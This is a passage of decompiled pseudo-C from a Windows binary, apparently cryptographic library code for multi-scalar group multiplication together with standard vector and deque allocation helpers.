        v27 = v55;
        v28 = (char *)v52[0] + 24 * (v26 - v58);
        v70 = v28;
        do
        {
          v29 = (int *)(*(int (__thiscall **)(int *, char *, unsigned int))(*this + 12))(this, v28, v57);
          sub_40EC6C(v27, v29);
          v26 += v58;
          v28 = &v70[v54];
          v27 += v54;
          v25 = v67;
          v70 += v54;
        }
        while ( v26 < v67 );
        v11 = v64;
      }
      v71 = v11;
      if ( v11 < v25 )
      {
        v30 = 2 * v11;
        v57 = 2 * v11;
        v59 = 2 * v11;
        v61 = 48 * v11;
        v31 = (char *)v52[0] + 24 * v11 + 48;
        v54 = 2 - v11;
        v32 = v67;
        v58 = (unsigned int)v31;
        do
        {
          v55 = v30 + v54;
          v33 = v57;
          if ( v30 + v54 < v30 )
          {
            v60 = v31;
            v34 = v30 - v55;
            v35 = (int)v31;
            v36 = ((unsigned int)(v34 - 1) >> 1) + 1;
            do
            {
              v37 = (int *)(*(int (__thiscall **)(int *, int, int *))(*this + 12))(this, v35 - 24, a3);
              sub_40EC6C(v35, v37);
              v35 += 48;
              --v36;
            }
            while ( v36 );
            v30 = v59;
            v31 = (char *)v58;
            v32 = v67;
            v33 = v57;
            v11 = v71;
          }
          v31 += v61;
          v11 += v33;
          v30 += v33;
          v71 = v11;
          v58 = (unsigned int)v31;
          v59 = v30;
        }
        while ( v11 < v32 );
      }
    }
    sub_40E940(&v50);
    v38 = 0;
    v39 = 0;
    LOBYTE(v68) = 1;
    v40 = v53 - 1;
    v57 = v53 - 1;
    for ( i = v53 - 1 < 0; ; i = v40 < 0 )
    {
      v72 = v40;
      if ( i )
        break;
      v38 = (unsigned __int8)sub_411C2A(a4, v40) + 2 * v38;
      v42 = sub_411C2A(a6, v72);
      v43 = v72;
      v39 = v42 + 2 * v39;
      if ( !v72 || 2 * v38 >= v64 || 2 * v39 >= v64 )
      {
        v44 = v57 - v72;
        v57 = v72;
        v69 = 0;
        while ( (v38 || v39) && (((unsigned __int8)v38 | (unsigned __int8)v39) & 1) == 0 )
        {
          v38 >>= 1;
          v39 >>= 1;
          --v44;
          ++v69;
        }
        if ( (_BYTE)v56 )
        {
          sub_40EC6C((int)&v50, (int *)v52[0] + 6 * v38 + 6 * (v39 << v63));
          LOBYTE(v56) = 0;
        }
        else
        {
          while ( v44 )
          {
            v45 = *this;
            v53 = v44 - 1;
            v46 = (int *)(*(int (__thiscall **)(int *, int *))(v45 + 24))(this, &v50);
            sub_40EC6C((int)&v50, v46);
            v44 = v53;
          }
          if ( v38 || v39 )
            (*(void (__thiscall **)(int *, int *, char *))(*this + 32))(
              this,
              &v50,
              (char *)v52[0] + 24 * v38 + 24 * (v39 << v63));
        }
        for ( j = v69; j; --j )
        {
          v48 = (int *)(*(int (__thiscall **)(int *, int *))(*this + 24))(this, &v50);
          sub_40EC6C((int)&v50, v48);
        }
        v43 = v72;
        v39 = 0;
        v38 = 0;
      }
      v40 = v43 - 1;
    }
    sub_40E80A(a2, &v50);
    sub_40891D((int)v51);
    sub_42682C(v52);
  }
  else
  {
    v9 = (int *)(*(int (__thiscall **)(int *))(*this + 8))(this);
    sub_40E80A(a2, v9);
  }
  return a2;
}
// 425C2C: using guessed type char var_6C[20];

//----- (00426016) --------------------------------------------------------
_DWORD *__thiscall sub_426016(void *this, _DWORD *a2, int a3, int a4)
{
  sub_40E940(a2);
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 84))(this, a2, a3, a4, 1);
  return a2;
}

//----- (0042605A) --------------------------------------------------------
char __thiscall sub_42605A(int this)
{
  unsigned int v2; // ebx
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  bool v6; // zf
  int v7; // ecx

  v2 = 32 * sub_41C5A2((int *)this);
  if ( *(_BYTE *)(this + 62) )
    v3 = 0;
  else
    v3 = *(_DWORD *)(this + 48);
  *(_BYTE *)(this + 62) = 0;
  while ( 1 )
  {
    LOBYTE(v4) = sub_411C2A((_DWORD *)this, v3);
    if ( (_BYTE)v4 )
      break;
    if ( v3 >= v2 )
    {
      *(_BYTE *)(this + 63) = 1;
      return v4;
    }
    ++v3;
  }
  sub_40EFBC((int *)this, v3);
  v5 = *(_DWORD *)(this + 48);
  *(_DWORD *)(this + 52) += v3;
  v4 = sub_41222B((int *)this, 1 << v5);
  v6 = *(_BYTE *)(this + 60) == 0;
  *(_DWORD *)(this + 56) = v4;
  if ( v6 || (LOBYTE(v4) = sub_411C2A((_DWORD *)this, *(_DWORD *)(this + 48)), !(_BYTE)v4) )
  {
    *(_BYTE *)(this + 61) = 0;
  }
  else
  {
    v7 = *(_DWORD *)(this + 48);
    *(_BYTE *)(this + 61) = 1;
    *(_DWORD *)(this + 56) = (1 << v7) - *(_DWORD *)(this + 56);
    LOBYTE(v4) = (unsigned __int8)sub_40EF1C((_DWORD *)this, this + 24);
  }
  return v4;
}

//----- (004260EA) --------------------------------------------------------
int __thiscall sub_4260EA(int *this, int *a2, int *a3)
{
  int v4; // esi
  int v5; // edi
  int v6; // eax
  char v7; // al
  int *v8; // edi
  int *v9; // eax
  int v10; // eax
  int v11; // esi
  int v12; // eax
  int v13; // eax
  int v14; // esi
  int v16; // [esp+10h] [ebp-64h]
  int v17; // [esp+14h] [ebp-60h]
  int v18; // [esp+18h] [ebp-5Ch]
  int v19[6]; // [esp+1Ch] [ebp-58h] BYREF
  char v20[24]; // [esp+34h] [ebp-40h] BYREF
  char v21[36]; // [esp+4Ch] [ebp-28h] BYREF
  int v22; // [esp+70h] [ebp-4h]

  sub_40E80A(v19, a3);
  v16 = 0;
  v22 = 0;
  sub_40E80A(v20, a2);
  v18 = 1;
  LOBYTE(v22) = 1;
  `eh vector constructor iterator'(v21, 0x18u, 1u, (void (__thiscall *)(void *))sub_40E940, sub_406A1E);
  v4 = *this;
  v5 = 2;
  v17 = 2;
  v22 = 2;
  v6 = (*(int (__thiscall **)(int *))(v4 + 8))(this);
  v7 = (*(int (__thiscall **)(int *, char *, int))(v4 + 4))(this, v20, v6);
  while ( !v7 )
  {
    v8 = &v19[6 * v5];
    v9 = (int *)(*(int (__thiscall **)(int *, int *, int *))(*this + 96))(this, &v19[6 * v16], &v19[6 * v18]);
    sub_40EC6C((int)v8, v9);
    v10 = v16;
    v16 = v18;
    v11 = *this;
    v18 = v17;
    v17 = v10;
    v12 = (*(int (__thiscall **)(int *))(*this + 8))(this);
    v7 = (*(int (__thiscall **)(int *, int *, int))(v11 + 4))(this, v8, v12);
    v5 = v17;
  }
  v13 = sub_40EC6C((int)(this + 3), &v19[6 * v16]);
  v22 = -1;
  v14 = v13;
  `eh vector destructor iterator'(v19, 0x18u, 3u, sub_406A1E);
  return v14;
}
// 4260EA: using guessed type int var_58[6];
// 4260EA: using guessed type char var_28[36];

//----- (004261D6) --------------------------------------------------------
_DWORD *__thiscall sub_4261D6(void *this, _DWORD *a2, int a3, int a4)
{
  sub_40E940(a2);
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 48))(this, a2, a3, a4, 1);
  return a2;
}

//----- (0042621A) --------------------------------------------------------
int __thiscall sub_42621A(void *this, int a2, int *a3, int *a4, unsigned int a5)
{
  int *v5; // eax

  v5 = (int *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 88))(this);
  return sub_426239(v5, a2, a3, a4, a5);
}

//----- (00426239) --------------------------------------------------------
int __thiscall sub_426239(int *this, int a2, int *a3, int *a4, unsigned int a5)
{
  unsigned int v6; // ebx
  _DWORD *v7; // esi
  int v8; // ebx
  char v9; // al
  int v10; // eax
  int v11; // esi
  int *v12; // eax
  int v13; // ecx
  int v14; // esi
  bool v15; // zf
  char v16; // al
  int v17; // edx
  int v18; // ebx
  int v19; // ecx
  int v20; // edx
  int v21; // esi
  int v22; // eax
  int *v23; // eax
  _DWORD *v24; // esi
  unsigned int v25; // eax
  int v26; // eax
  int v27; // ecx
  int v28; // ebx
  int v29; // esi
  int v30; // eax
  int *v31; // eax
  char v33[4]; // [esp+10h] [ebp-94h] BYREF
  char v34[24]; // [esp+14h] [ebp-90h] BYREF
  char v35[36]; // [esp+2Ch] [ebp-78h] BYREF
  char v36[4]; // [esp+50h] [ebp-54h] BYREF
  char v37[20]; // [esp+54h] [ebp-50h] BYREF
  int v38[3]; // [esp+68h] [ebp-3Ch] BYREF
  int v39; // [esp+74h] [ebp-30h]
  int v40[3]; // [esp+78h] [ebp-2Ch] BYREF
  int v41; // [esp+84h] [ebp-20h]
  _DWORD *v42; // [esp+88h] [ebp-1Ch]
  int v43; // [esp+8Ch] [ebp-18h]
  _DWORD *v44; // [esp+90h] [ebp-14h]
  int v45; // [esp+94h] [ebp-10h]
  int v46; // [esp+A0h] [ebp-4h]
  int v47; // [esp+B0h] [ebp+Ch]
  int v48; // [esp+B0h] [ebp+Ch]
  int v49; // [esp+B4h] [ebp+10h]
  char v50; // [esp+B7h] [ebp+13h]

  v6 = a5;
  sub_4259EE(v38, a5);
  v46 = 1;
  memset(v40, 0, sizeof(v40));
  sub_4268F7(v40, a5);
  v7 = (_DWORD *)v38[0];
  v39 = 24;
  v42 = (_DWORD *)v38[0];
  if ( a5 )
  {
    v43 = 0;
    v44 = (_DWORD *)a5;
    v8 = 0;
    v45 = v38[0];
    do
    {
      v9 = (*(int (__thiscall **)(int *))(*this + 20))(this);
      v10 = sub_425B04((int)v33, a4, v9, 0);
      LOBYTE(v46) = 2;
      sub_426887(v40, v10);
      LOBYTE(v46) = 1;
      a4 += 6;
      sub_40891D((int)v35);
      sub_40891D((int)v34);
      v11 = v8 + v40[0];
      sub_42605A(v8 + v40[0]);
      v12 = (int *)(*(int (__thiscall **)(int *))(*this + 8))(this);
      v13 = *(_DWORD *)(v11 + 48);
      v14 = v45;
      sub_426922(v45, 1 << (v13 - 1), v12);
      v8 += 64;
      v15 = v44 == (_DWORD *)1;
      v44 = (_DWORD *)((char *)v44 - 1);
      v45 = v14 + 12;
    }
    while ( !v15 );
    v6 = a5;
    v7 = (_DWORD *)v38[0];
  }
  v45 = 0;
  sub_40E80A(v36, a3);
  LOBYTE(v46) = 3;
  while ( 1 )
  {
    v16 = 0;
    v50 = 0;
    if ( !v6 )
      break;
    v17 = v6;
    v18 = v45;
    v19 = v40[0] + 56;
    v44 = v7;
    v47 = v40[0] + 56;
    v43 = v17;
    do
    {
      if ( !*(_BYTE *)(v19 + 7) && v18 == *(_DWORD *)(v19 - 4) )
      {
        v20 = *v7 + 24 * (*(_DWORD *)v19 >> 1);
        v15 = *(_BYTE *)(v19 + 5) == 0;
        v41 = v20;
        if ( v15 )
        {
          (*(void (__thiscall **)(int *, int, char *))(*this + 32))(this, v20, v36);
        }
        else
        {
          v21 = *this;
          v22 = (*(int (__thiscall **)(int *, char *))(*this + 16))(this, v36);
          (*(void (__thiscall **)(int *, int, int))(v21 + 32))(this, v41, v22);
          v7 = v44;
        }
        sub_42605A(v47 - 56);
        v19 = v47;
        v16 = v50;
        v17 = v43;
      }
      if ( v16 || !*(_BYTE *)(v19 + 7) )
        v16 = 1;
      v7 += 3;
      v50 = v16;
      v19 += 64;
      v44 = v7;
      --v17;
      v47 = v19;
      v43 = v17;
    }
    while ( v17 );
    v6 = a5;
    if ( !v16 )
    {
      if ( a5 )
      {
        v24 = (_DWORD *)v38[0];
        do
        {
          v49 = a2;
          a2 += 24;
          sub_40EC6C(v49, (int *)(*v24 - 24 + 24 * ((v24[1] - *v24) / v39)));
          v25 = (v24[1] - *v24) / 24;
          if ( v25 > 1 )
          {
            v26 = v25 - 2;
            v41 = v26;
            if ( v26 >= 1 )
            {
              v27 = 24 * v26;
              v28 = v26;
              v48 = 24 * v26;
              do
              {
                (*(void (__thiscall **)(int *, int, int))(*this + 32))(this, *v24 + v27, *v24 + v27 + 24);
                (*(void (__thiscall **)(int *, int, int))(*this + 32))(this, v49, v48 + *v24);
                v27 = v48 - 24;
                v48 -= 24;
                --v28;
              }
              while ( v28 );
              v6 = a5;
            }
            (*(void (__thiscall **)(int *, _DWORD, int))(*this + 32))(this, *v24, *v24 + 24);
            v29 = *this;
            v30 = (*(int (__thiscall **)(int *, int, _DWORD))(*this + 24))(this, v49, *v42);
            v31 = (int *)(*(int (__thiscall **)(int *, int))(v29 + 12))(this, v30);
            sub_40EC6C(v49, v31);
            v24 = v42;
          }
          v24 += 3;
          --v6;
          v42 = v24;
          a5 = v6;
        }
        while ( v6 );
      }
      break;
    }
    v23 = (int *)(*(int (__thiscall **)(int *, char *))(*this + 24))(this, v36);
    sub_40EC6C((int)v36, v23);
    ++v45;
    v7 = (_DWORD *)v38[0];
  }
  sub_40891D((int)v37);
  sub_4267BC((int)v40);
  return sub_4267F6((int)v38);
}
// 426239: using guessed type char var_94[4];
// 426239: using guessed type char var_78[36];
// 426239: using guessed type char var_90[24];
// 426239: using guessed type char var_54[4];
// 426239: using guessed type char var_50[20];

//----- (004264D7) --------------------------------------------------------
char __thiscall sub_4264D7(_DWORD *this, unsigned int a2)
{
  char result; // al
  _DWORD *v4; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( !a2 )
    return 0;
  if ( a2 > 0x15555555 )
    sub_429710("vector<T> too long");
  v4 = sub_40B7DF(a2, 0xCu, 1);
  *this = v4;
  this[1] = v4;
  result = 1;
  this[2] = *this + 12 * a2;
  return result;
}

//----- (00426525) --------------------------------------------------------
char __thiscall sub_426525(_DWORD *this, unsigned int a2)
{
  char result; // al
  _DWORD *v4; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( !a2 )
    return 0;
  if ( a2 > 0xAAAAAAA )
    sub_429710("vector<T> too long");
  v4 = sub_40B7DF(a2, 0x18u, 1);
  *this = v4;
  this[1] = v4;
  result = 1;
  this[2] = *this + 24 * a2;
  return result;
}

//----- (00426573) --------------------------------------------------------
unsigned int __thiscall sub_426573(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int result; // eax

  v2 = (this[2] - *this) >> 6;
  result = 0;
  if ( 0x3FFFFFF - (v2 >> 1) >= v2 )
    result = (v2 >> 1) + v2;
  if ( result < a2 )
    return a2;
  return result;
}

//----- (0042659E) --------------------------------------------------------
unsigned int __thiscall sub_42659E(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int v3; // eax

  v2 = 0;
  v3 = (this[2] - *this) / 24;
  if ( 178956970 - (v3 >> 1) >= v3 )
    v2 = v3 + (v3 >> 1);
  if ( v2 < a2 )
    return a2;
  return v2;
}

//----- (004265CD) --------------------------------------------------------
int __thiscall sub_4265CD(_DWORD *this, int a2)
{
  int (__thiscall ***v3)(_DWORD, _DWORD); // esi
  int result; // eax
  int (__thiscall ***v5)(_DWORD, _DWORD); // [esp-8h] [ebp-10h]

  v5 = (int (__thiscall ***)(_DWORD, _DWORD))this[1];
  v3 = &v5[-6 * a2];
  result = sub_4257E5(v3, v5);
  this[1] = v3;
  return result;
}

//----- (004265F0) --------------------------------------------------------
_DWORD *__thiscall sub_4265F0(int *this, unsigned int a2)
{
  int v3; // edi
  _DWORD *result; // eax
  _DWORD *v6; // [esp+10h] [ebp-14h]

  v6 = sub_40B7DF(a2, 0x40u, 1);
  sub_4259A4(*this, this[1], (int)v6);
  v3 = this[1] - *this;
  if ( *this )
  {
    sub_4257B1((char *)*this, (char *)this[1]);
    std::_Deallocate((void *)*this, (this[2] - *this) >> 6, 0x40u);
  }
  result = v6;
  this[2] = (int)&v6[16 * a2];
  this[1] = (int)v6 + (v3 & 0xFFFFFFC0);
  *this = (int)v6;
  return result;
}

//----- (00426685) --------------------------------------------------------
char *__thiscall sub_426685(void **this, unsigned int a2)
{
  char *v4; // edi
  char *result; // eax
  int v6; // [esp+2Ch] [ebp+8h]

  v4 = (char *)sub_40B7DF(a2, 0x18u, 1);
  sub_4259C9((int *)*this, (int *)this[1], v4);
  v6 = ((_BYTE *)this[1] - (_BYTE *)*this) / 24;
  if ( *this )
  {
    sub_4257E5((int (__thiscall ***)(_DWORD, _DWORD))*this, (int (__thiscall ***)(_DWORD, _DWORD))this[1]);
    std::_Deallocate(*this, ((_BYTE *)this[2] - (_BYTE *)*this) / 24, 0x18u);
  }
  this[2] = &v4[24 * a2];
  result = &v4[24 * v6];
  this[1] = result;
  *this = v4;
  return result;
}

//----- (00426724) --------------------------------------------------------
unsigned int __thiscall sub_426724(int *this, unsigned int a2)
{
  int v3; // edx
  unsigned int result; // eax
  int v5; // edx
  unsigned int v6; // eax

  v3 = this[1];
  result = (this[2] - v3) >> 6;
  if ( result < a2 )
  {
    v5 = (v3 - *this) >> 6;
    if ( 0x3FFFFFF - v5 < a2 )
      sub_429710("vector<T> too long");
    v6 = sub_426573(this, v5 + a2);
    return (unsigned int)sub_4265F0(this, v6);
  }
  return result;
}

//----- (0042676C) --------------------------------------------------------
unsigned int __thiscall sub_42676C(void **this, unsigned int a2)
{
  _BYTE *v3; // eax
  _BYTE *v4; // ecx
  unsigned int result; // eax
  int v6; // eax
  unsigned int v7; // eax

  v3 = this[2];
  v4 = this[1];
  result = (v3 - v4) / 24;
  if ( result < a2 )
  {
    v6 = (v4 - (_BYTE *)*this) / 24;
    if ( 178956970 - v6 < a2 )
      sub_429710("vector<T> too long");
    v7 = sub_42659E(this, a2 + v6);
    return (unsigned int)sub_426685(this, v7);
  }
  return result;
}

//----- (004267BC) --------------------------------------------------------
int __thiscall sub_4267BC(int this)
{
  int result; // eax

  if ( *(_DWORD *)this )
  {
    sub_4257B1(*(char **)this, *(char **)(this + 4));
    std::_Deallocate(*(void **)this, (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 6, 0x40u);
    result = 0;
    *(_DWORD *)this = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (004267F6) --------------------------------------------------------
int __thiscall sub_4267F6(int this)
{
  int result; // eax

  if ( *(_DWORD *)this )
  {
    sub_4257CC(*(void ***)this, *(void ***)(this + 4));
    std::_Deallocate(*(void **)this, (*(_DWORD *)(this + 8) - *(_DWORD *)this) / 12, 0xCu);
    result = 0;
    *(_DWORD *)this = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (0042682C) --------------------------------------------------------
int __thiscall sub_42682C(void **this)
{
  int result; // eax

  if ( *this )
  {
    sub_4257E5((int (__thiscall ***)(_DWORD, _DWORD))*this, (int (__thiscall ***)(_DWORD, _DWORD))this[1]);
    std::_Deallocate(*this, ((_BYTE *)this[2] - (_BYTE *)*this) / 24, 0x18u);
    result = 0;
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
  return result;
}

//----- (00426862) --------------------------------------------------------
char *__stdcall sub_426862(char *a1, int a2, int *a3)
{
  sub_4257FF(a1, a2, a3);
  return &a1[24 * a2];
}

//----- (00426887) --------------------------------------------------------
unsigned int __thiscall sub_426887(int *this, unsigned int a2)
{
  unsigned int result; // eax
  int v4; // edi
  unsigned int v5; // edi
  int v6; // ecx

  result = this[1];
  v4 = a2;
  if ( a2 >= result || *this > a2 )
  {
    if ( result == this[2] )
      result = sub_426724(this, 1u);
    v6 = this[1];
  }
  else
  {
    v5 = a2 - *this;
    if ( result == this[2] )
      result = sub_426724(this, 1u);
    v6 = this[1];
    v4 = *this + (v5 & 0xFFFFFFC0);
  }
  if ( v6 )
    result = sub_425AA6(v6, v4);
  this[1] += 64;
  return result;
}

//----- (004268F7) --------------------------------------------------------
unsigned int __thiscall sub_4268F7(int *this, unsigned int a2)
{
  unsigned int result; // eax

  result = (this[2] - *this) >> 6;
  if ( result < a2 )
  {
    if ( a2 > 0x3FFFFFF )
      sub_429710("vector<T> too long");
    return (unsigned int)sub_4265F0(this, a2);
  }
  return result;
}

//----- (00426922) --------------------------------------------------------
unsigned int __thiscall sub_426922(int this, unsigned int a2, int *a3)
{
  unsigned int result; // eax
  int *v5; // esi
  int v6; // esi

  result = (*(_DWORD *)(this + 4) - *(_DWORD *)this) / 24;
  if ( result > a2 )
    return sub_4265CD((_DWORD *)this, result - a2);
  if ( result < a2 )
  {
    v5 = a3;
    if ( (unsigned int)a3 >= *(_DWORD *)(this + 4) || *(_DWORD *)this > (unsigned int)a3 )
    {
      sub_42676C((void **)this, a2 - result);
    }
    else
    {
      v6 = ((int)a3 - *(_DWORD *)this) / 24;
      sub_42676C((void **)this, a2 - result);
      v5 = (int *)(*(_DWORD *)this + 24 * v6);
    }
    sub_426862(*(char **)(this + 4), a2 - (*(_DWORD *)(this + 4) - *(_DWORD *)this) / 24, v5);
    result = 24 * (a2 - (*(_DWORD *)(this + 4) - *(_DWORD *)this) / 24);
    *(_DWORD *)(this + 4) += result;
  }
  return result;
}

//----- (004269DC) --------------------------------------------------------
int __cdecl sub_4269DC(int a1, unsigned int a2, int a3, int a4, int *a5)
{
  unsigned int i; // esi
  int result; // eax

  for ( i = a2; i != a4; a2 = i )
  {
    result = *a5;
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * ((i >> 2) & (*(_DWORD *)(a1 + 8) - 1))) + 4 * (i & 3)) = *a5;
    i = a2 + 1;
  }
  return result;
}

//----- (00426A18) --------------------------------------------------------
int __cdecl sub_426A18(int a1, unsigned int a2, int a3, int a4, _DWORD *a5)
{
  unsigned int i; // esi
  unsigned int v6; // eax
  int v7; // esi
  int v8; // ecx
  int result; // eax

  for ( i = a2; i != a4; a2 = i )
  {
    v6 = i >> 1;
    v7 = i & 1;
    v8 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * (v6 & (*(_DWORD *)(a1 + 8) - 1)));
    *(_DWORD *)(v8 + 8 * v7) = *a5;
    result = a5[1];
    *(_DWORD *)(v8 + 8 * v7 + 4) = result;
    i = a2 + 1;
  }
  return result;
}

//----- (00426A5A) --------------------------------------------------------
int __cdecl sub_426A5A(int a1, unsigned int a2, int a3, int a4, int *a5)
{
  return sub_4269DC(a1, a2, a3, a4, a5);
}

//----- (00426A80) --------------------------------------------------------
int __cdecl sub_426A80(int a1, unsigned int a2, int a3, int a4, _DWORD *a5)
{
  return sub_426A18(a1, a2, a3, a4, a5);
}

//----- (00426AA6) --------------------------------------------------------
_DWORD *__cdecl sub_426AA6(_DWORD *a1, int a2, int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8)
{
  int v8; // eax
  unsigned int v9; // edi
  int v11[3]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h] BYREF

  v11[0] = 0;
  v11[1] = 0;
  sub_41D6C1(v11, &a6);
  if ( v11[0] )
    v8 = *(_DWORD *)v11[0];
  else
    v8 = 0;
  v9 = sub_426C52(&v12, a2, a3, a4, a5, v8, a8)[1];
  a8 = v9;
  *a1 = 0;
  a1[1] = 0;
  sub_41D6C1(a1, &a6);
  a1[2] = v9;
  return a1;
}

//----- (00426B11) --------------------------------------------------------
_DWORD *__cdecl sub_426B11(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, _DWORD **a6, int a7, unsigned int a8)
{
  int v8; // eax
  unsigned int v9; // edi
  int v11[3]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h] BYREF

  v11[0] = 0;
  v11[1] = 0;
  sub_41D6C1(v11, &a6);
  if ( v11[0] )
    v8 = *(_DWORD *)v11[0];
  else
    v8 = 0;
  v9 = sub_426C81(&v12, a2, a3, a4, a5, v8, a8)[1];
  a8 = v9;
  *a1 = 0;
  a1[1] = 0;
  sub_41D6C1(a1, &a6);
  a1[2] = v9;
  return a1;
}

//----- (00426B7C) --------------------------------------------------------
_DWORD *__cdecl sub_426B7C(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, unsigned int a7)
{
  int i; // ebx
  _DWORD *result; // eax

  for ( i = a5; a3 != i; --i )
  {
    --a7;
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a6 + 4) + 4 * ((a7 >> 2) & (*(_DWORD *)(a6 + 8) - 1))) + 4 * (a7 & 3)) = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a4 + 4) + 4 * (((unsigned int)(i - 1) >> 2) & (*(_DWORD *)(a4 + 8) - 1))) + 4 * ((i - 1) & 3));
  }
  result = a1;
  *a1 = a6;
  a1[1] = a7;
  return result;
}

//----- (00426BE4) --------------------------------------------------------
_DWORD *__cdecl sub_426BE4(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, int a6, unsigned int a7)
{
  unsigned int v7; // ebx
  int v8; // ebx
  int v9; // edi
  int v10; // esi
  int v11; // ecx
  _DWORD *result; // eax
  unsigned int v13; // [esp+1Ch] [ebp+18h]

  v7 = a5;
  if ( a3 != a5 )
  {
    do
    {
      v13 = v7 - 1;
      v8 = (v7 - 1) & 1;
      v9 = *(_DWORD *)(*(_DWORD *)(a4 + 4) + 4 * ((v13 >> 1) & (*(_DWORD *)(a4 + 8) - 1)));
      v10 = --a7 & 1;
      v11 = *(_DWORD *)(*(_DWORD *)(a6 + 4) + 4 * ((a7 >> 1) & (*(_DWORD *)(a6 + 8) - 1)));
      *(_DWORD *)(v11 + 8 * v10) = *(_DWORD *)(v9 + 8 * v8);
      *(_DWORD *)(v11 + 8 * v10 + 4) = *(_DWORD *)(v9 + 8 * v8 + 4);
      v7 = v13;
    }
    while ( a3 != v13 );
  }
  result = a1;
  *a1 = a6;
  a1[1] = a7;
  return result;
}

//----- (00426C52) --------------------------------------------------------
_DWORD *__cdecl sub_426C52(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, unsigned int a7)
{
  sub_426B7C(a1, a2, a3, a4, a5, a6, a7);
  return a1;
}

//----- (00426C81) --------------------------------------------------------
_DWORD *__cdecl sub_426C81(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, int a6, unsigned int a7)
{
  sub_426BE4(a1, a2, a3, a4, a5, a6, a7);
  return a1;
}

//----- (00426CB0) --------------------------------------------------------
_DWORD *__cdecl sub_426CB0(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8)
{
  int v8; // eax
  unsigned int v9; // edi
  int v11[3]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h] BYREF

  v11[0] = 0;
  v11[1] = 0;
  sub_41D6C1(v11, &a6);
  if ( v11[0] )
    v8 = *(_DWORD *)v11[0];
  else
    v8 = 0;
  v9 = sub_426F74(&v12, a2, a3, a4, a5, v8, a8)[1];
  a8 = v9;
  *a1 = 0;
  a1[1] = 0;
  sub_41D6C1(a1, &a6);
  a1[2] = v9;
  return a1;
}

//----- (00426D1B) --------------------------------------------------------
_DWORD *__cdecl sub_426D1B(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8)
{
  int v8; // eax
  unsigned int v9; // edi
  int v11[3]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h] BYREF

  v11[0] = 0;
  v11[1] = 0;
  sub_41D6C1(v11, &a6);
  if ( v11[0] )
    v8 = *(_DWORD *)v11[0];
  else
    v8 = 0;
  v9 = sub_426FA3(&v12, a2, a3, a4, a5, v8, a8)[1];
  a8 = v9;
  *a1 = 0;
  a1[1] = 0;
  sub_41D6C1(a1, &a6);
  a1[2] = v9;
  return a1;
}

//----- (00426D86) --------------------------------------------------------
_DWORD *__cdecl sub_426D86(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        unsigned int a4,
        _DWORD **a5,
        int a6,
        int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  int v10; // ebx
  int v11; // eax
  int v13; // [esp-1Ch] [ebp-38h]
  int v14; // [esp-18h] [ebp-34h]
  _DWORD **v15; // [esp-14h] [ebp-30h] BYREF
  int v16; // [esp-10h] [ebp-2Ch]
  unsigned int v17; // [esp-Ch] [ebp-28h]
  int v18; // [esp-8h] [ebp-24h]
  int v19; // [esp-4h] [ebp-20h]
  int *v20; // [esp+8h] [ebp-14h] BYREF
  int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+14h] [ebp-8h]
  int v23; // [esp+18h] [ebp-4h]

  v10 = 0;
  LOBYTE(v23) = 0;
  v19 = v23;
  LOBYTE(v22) = 0;
  v18 = v22;
  v15 = 0;
  v16 = 0;
  sub_41D6C1(&v15, &a8);
  v17 = a10;
  v20 = 0;
  v21 = 0;
  sub_41D6C1(&v20, &a5);
  if ( v20 )
    v11 = *v20;
  else
    v11 = 0;
  v14 = a7;
  v20 = 0;
  v13 = v11;
  v21 = 0;
  sub_41D6C1(&v20, &a2);
  if ( v20 )
    v10 = *v20;
  sub_426CB0(a1, v10, a4, v13, v14, v15, v16, v17);
  return a1;
}

//----- (00426E0D) --------------------------------------------------------
_DWORD *__cdecl sub_426E0D(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        unsigned int a4,
        _DWORD **a5,
        int a6,
        int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  int v10; // ebx
  int v11; // eax
  int v13; // [esp-1Ch] [ebp-38h]
  int v14; // [esp-18h] [ebp-34h]
  _DWORD **v15; // [esp-14h] [ebp-30h] BYREF
  int v16; // [esp-10h] [ebp-2Ch]
  unsigned int v17; // [esp-Ch] [ebp-28h]
  int v18; // [esp-8h] [ebp-24h]
  int v19; // [esp-4h] [ebp-20h]
  int *v20; // [esp+8h] [ebp-14h] BYREF
  int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+14h] [ebp-8h]
  int v23; // [esp+18h] [ebp-4h]

  v10 = 0;
  LOBYTE(v23) = 0;
  v19 = v23;
  LOBYTE(v22) = 0;
  v18 = v22;
  v15 = 0;
  v16 = 0;
  sub_41D6C1(&v15, &a8);
  v17 = a10;
  v20 = 0;
  v21 = 0;
